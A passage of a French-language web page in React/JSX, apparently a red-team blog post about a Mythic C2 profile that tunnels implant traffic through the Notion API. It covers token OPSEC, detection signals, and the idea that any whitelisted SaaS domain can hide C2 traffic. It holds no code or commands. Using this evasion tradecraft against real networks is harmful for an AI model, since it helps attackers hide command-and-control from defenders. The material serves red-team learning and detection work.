          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            OPSEC — token et base de données
          </h3>
          <p className="text-muted-foreground mb-3">
            Le token d&apos;intégration Notion est la clé de toute
            l&apos;infrastructure. Si il est compromis, l&apos;adversaire peut
            lire tous les messages en transit. Quelques pratiques à garder en
            tête :
          </p>
          <ul className="list-disc list-inside space-y-2 text-sm text-muted-foreground mb-4">
            <li>
              Créer un workspace Notion dédié, pas l&apos;espace personnel
            </li>
            <li>
              Révoquer le token à la fin de l&apos;opération
            </li>
            <li>
              La base de données s&apos;auto-nettoie (pages archivées) mais une
              rotation de base peut être utile sur des opérations longues
            </li>
            <li>
              <code className="rounded bg-muted px-1">mythic_encrypts = True</code> :
              Mythic chiffre le payload avant qu&apos;il arrive dans le profil.
              Même si quelqu&apos;un lit les pages Notion, il ne voit que du
              base64 opaque
            </li>
          </ul>
          <h3 className="mt-6 mb-3 font-mono text-lg font-semibold">
            Détection
          </h3>
          <p className="text-muted-foreground mb-3">
            Le trafic vers{" "}
            <code className="rounded bg-muted px-1">api.notion.com</code> est
            TLS et se noie dans le trafic SaaS légitime. La détection devra
            passer par d&apos;autres signaux : comportement de l&apos;implant,
            volumes inhabituels de requêtes vers Notion, User-Agent anormal,
            ou corrélation des timestamps des pages avec des activités suspectes.
            C&apos;est justement l&apos;intérêt du LoTS : le vecteur réseau
            devient le bruit de fond.
          </p>
          <InfoBox>
            <strong>Pour aller plus loin</strong> : un vrai déploiement
            production mériterait d&apos;ajouter une couche de traduction
            (Mythic Translation Container) pour un chiffrement custom, et de
            gérer le multi-agent proprement avec une queue de messages par
            agent_id plutôt qu&apos;un poll global. L&apos;implémentation
            actuelle est fonctionnelle pour du lab et de l&apos;apprentissage.
          </InfoBox>
        </section>

        {/* Conclusion */}
        <section className="rounded-lg border border-primary/20 bg-primary/5 p-6">
          <h2 className="mb-4 font-mono text-xl font-semibold">
            Ce que j&apos;en retire
          </h2>
          <p className="text-muted-foreground mb-3">
            Le projet m&apos;a surtout appris comment Mythic est architecturé
            en interne. La séparation des responsabilités est vraiment propre :
            le framework ne fait aucune hypothèse sur le transport, et créer un
            nouveau canal revient à écrire un proxy Python asyncio avec une
            classe de configuration. C&apos;est élégant.
          </p>
          <p className="text-muted-foreground mb-3">
            Sur le fond LoTS, ce qui est intéressant ce n&apos;est pas Notion en
            particulier. N&apos;importe quel SaaS avec une API REST peut faire
            le job. C&apos;est le pattern : utiliser l&apos;infrastructure de
            l&apos;adversaire, ou plutôt l&apos;infrastructure qu&apos;il fait
            confiance, contre lui. Chaque domaine whitelisté dans son firewall
            est un canal C2 potentiel.
          </p>
          <p className="text-muted-foreground">
            Le code est disponible sur{" "}
            <a
              href="https://github.com/0xbbuddha/notion"
              target="_blank"
              rel="noopener noreferrer"
              className="text-primary underline underline-offset-4 hover:no-underline"
            >
              github.com/0xbbuddha/notion-c2
            </a>
            . Pour authorized security testing seulement.
          </p>
        </section>
      </article>
    </div>
  );
}
